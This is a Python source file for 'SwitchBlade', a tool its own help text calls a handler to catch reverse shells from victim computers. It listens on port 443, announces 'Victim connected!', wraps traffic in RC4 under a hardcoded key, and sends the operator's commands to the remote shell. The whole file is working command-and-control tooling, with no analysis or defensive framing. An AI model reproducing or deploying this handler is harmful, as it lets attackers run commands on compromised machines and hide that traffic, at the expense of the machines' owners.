#!/bin/env python3
# SwitchBlade - a python based TCP/IP handler for remote connections
# It's not as versatile as the Swiss-Army knife, but it's real good for stabbin'
# Author: Connor Gannon (Gin&Miskatonic)
# Init Date: 14 Nov 2018
#
import sys
import os
import time
import socket
import threading

from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout
import argparse

import nclib
from nclib.errors import NetcatError, NetcatTimeout

import re
ansi_escape = re.compile(r'\x1b[^m]*m') # re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')

###############################
######## RC4 Setup ############
key="password"
key = [ord(c) for c in key]
S = list(range(256))
j = 0
for i in range(256):
    j = (j + S[i] + key[i % len(key)]) % 256
    S[i], S[j] = S[j], S[i]
i = j = 0
###############################


def prga():
    global S
    global i, j
    while True:
        #print(i,j)
        #print(S)
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        next_key = S[(S[i] + S[j]) % 256]
        #print("Keystream: {}".format(next_key))
        yield next_key

def rc4(msg):
    msg = [ord(c) if not type(c) is int else c for c in msg]

    return bytes(msgbyte ^ keybyte for msgbyte, keybyte in zip(msg, prga()))
    #return bytes(b"".join([chr(ord(msgbyte) ^ keybyte) for msgbyte, keybyte in zip(msg, prga())]))



class Switchblade:
    
    def __init__(self, port=443, sendLog=None, recvLog=None):
        self.port = port
        self.sendLog = sendLog
        self.recvLog = recvLog
        self.nc = nclib.Netcat(listen=('0.0.0.0',self.port), log_send=self.sendLog, log_recv=self.recvLog)
        self.assume_prompt = True
        self.prompt_str = ""
        print("Victim connected!")

    def setPromptStr(self, prompt):
        self.prompt_str = ansi_escape.sub('', prompt)

    def runCommand(self, cmd):
        '''runCommand - executes a command based on str parameter and returns the result as a string'''
        proc = nclib.Process(cmd.split(' ')[0])
        proc.send(str.encode(' '.join(cmd.split(' ')[1:])))
    # can add support for piping here by writing a for loop that uses these connections to bounce data from one command to the next
        output = proc.recv()  #.decode()
        proc.close()
        return output

    def builtins(self, cmd):
        print("There are no builtins.")

    def encrypt(self, msg):
        if key:
            return rc4(msg)
        return msg

    def decrypt(self, msg):
        return self.encrypt(msg)  #symmetric

    def recv(self):
        while True:
            try:
                #msg = self.nc.recv().decode().strip()
                msg = self.nc.recv()  #.decode()
                if not msg:
                    raise NetcatError
                
                msg = self.decrypt(msg)
                # Keep the data binary, just print a text representation to the screen
                #print("Received {} chars".format(len(msg)))
                msg_str = msg.decode(errors="ignore")
                if len(msg) != len(msg.decode(errors="ignore")):
                    print("Decoding error: {} chars removed".format(len(msg) - len(msg.decode(errors="ignore"))))
                if self.assume_prompt:
                    #print("Spliting message")
                    split = msg_str.rsplit("\n", 1)
                    #print(split)
                    #if len(split) > 1:
                    #    print("Using: {}".format( split[1]))
                    self.setPromptStr(split[-1])
                    # If there isn't actually a prompt, this is very, very dangerous
                    if len(split) > 1:
                        msg_str = split[0]
                    else:
                        # we set it to the prompt_str already. Not safe, but okay
                        msg_str = ""
                print(msg_str)
            except (socket.error, NetcatError):
                print("recv machine broke.")

    def send(self,cmd):
        cmd = cmd+'\n'
        cmd = self.encrypt(cmd)
        #self.nc.send(str.encode(cmd))
        #print("Sending {} chars".format(len(cmd)))
        self.nc.send(cmd)

    def listener(self):
        global prompt_str
        print ("Session starting...")
        self.session = PromptSession()
        recv_thread = threading.Thread(target=self.recv)
        recv_thread.daemon = True
        try:
            recv_thread.start()
            while True:
                with patch_stdout():
                    
                    if self.assume_prompt:
                        # Slight delay in case the prompt changed
                        time.sleep(0.25)
                        if not self.prompt_str:
                            for i in range(10, 0, -1):
                                print("Waiting {}s to receive prompt...".format(i))
                                time.sleep(1)
                                if self.prompt_str:
                                    break
                    cmd = self.session.prompt(self.prompt_str)
                    if cmd == "bye netcat":
                        break
                    preface = cmd.split(':')[0]
                    if preface == 'cmd':
                        cmd = self.runCommand(':'.join(cmd.split(':')[1:]))
                    elif preface == 'builtin':
                        self.builtins(':'.join(cmd.split(':')[1:]))
                        continue # builtins do not execute on victim side
                    self.send(cmd)
        except (socket.error, NetcatError):
            print("send machine broke.")
        self.nc.close()

if __name__=="__main__":
    parser=argparse.ArgumentParser(description='A smart handler to catch reverse shells from victim computers.')
    parser.add_argument('-p', default=443, type=int, required=False, help="The port on which switchblade will listen")
    parser.add_argument('--send-log', type=str, required=False, help="A filepath to log connection information about output")
    parser.add_argument('--recv-log', type=str, required=False, help="A filepath to log information about input")
    args = parser.parse_args(sys.argv[1:])
    sb = Switchblade(args.p,args.send_log,args.recv_log)
    sb.listener()
